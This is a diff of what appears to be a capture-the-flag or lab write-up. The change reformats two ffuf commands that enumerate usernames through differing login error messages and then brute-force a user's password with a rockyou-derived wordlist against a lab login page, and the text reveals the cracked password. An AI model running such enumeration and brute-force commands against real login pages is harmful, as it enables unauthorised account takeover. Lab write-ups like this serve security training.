@@ -61,7 +61,11 @@ If we go back to the login, lets see what happens if we login with the wrong pas
 
 The error message is different, lets see if we can use this to discover any other accounts:
 
-	ffuf -X POST -H "Content-Type: application/x-www-form-urlencoded" -u "http://154.57.164.82:31187/login.php" -d "username=FUZZ&password=Playstation3" -fr "Unknown username or password." -fc 403 -w /usr/share/seclists/Usernames/Names/names.txt
+	ffuf -X POST -H "Content-Type: application/x-www-form-urlencoded" \
+		-u "http://154.57.164.82:31187/login.php" \
+		-d "username=FUZZ&password=Playstation3" \
+		-fr "Unknown username or password." -fc 403 \
+		-w /usr/share/seclists/Usernames/Names/names.txt
 
 - This reveals a username! Now lets see if we can brute force their password.
 
@@ -76,7 +80,11 @@ First, well simplify the rockyou wordlist to fit the password restrictions:
 
 Now we'll use our custom wordlist to brute force gladys' password:
 
-	ffuf -X POST -H "Content-Type: application/x-www-form-urlencoded" -u "http://154.57.164.82:31187/login.php" -d "username=gladys&password=FUZZ" -fr "Invalid credentials." -fc 403 -w rockyou.txt 
+	ffuf -X POST -H "Content-Type: application/x-www-form-urlencoded" \
+		-u "http://154.57.164.82:31187/login.php" \
+		-d "username=gladys&password=FUZZ" \
+		-fr "Invalid credentials." -fc 403 \
+		-w rockyou.txt
 
 - The fuzzing shows that gladys' password is dWinaldasD13.
 
